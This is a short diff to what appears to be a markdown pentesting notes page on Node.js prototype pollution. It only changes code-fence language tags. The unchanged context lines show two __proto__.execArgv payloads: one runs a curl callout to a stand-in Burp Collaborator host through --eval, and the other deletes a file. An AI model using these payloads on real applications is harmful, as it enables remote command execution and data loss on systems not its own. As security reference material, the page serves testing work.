@@ -16,7 +16,7 @@ Can be toggled with [[Prototype Pollution Environment Variable Overwriting]] to 
 ```
 # child_process.fork() `execArgv` Pollution
 Allows arbitrary commands to be eval'd. Even allows requiring new modules.
-```
+```javascript
 "__proto__": {
     "execArgv":[
         "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
@@ -32,7 +32,7 @@ Allows arbitrary commands to be eval'd. Even allows requiring new modules.
 }
 ```
 
-```
+```js
 "__proto__": {
     "execArgv": [
 	    "--eval=fs.unlinkSync('./temp')"
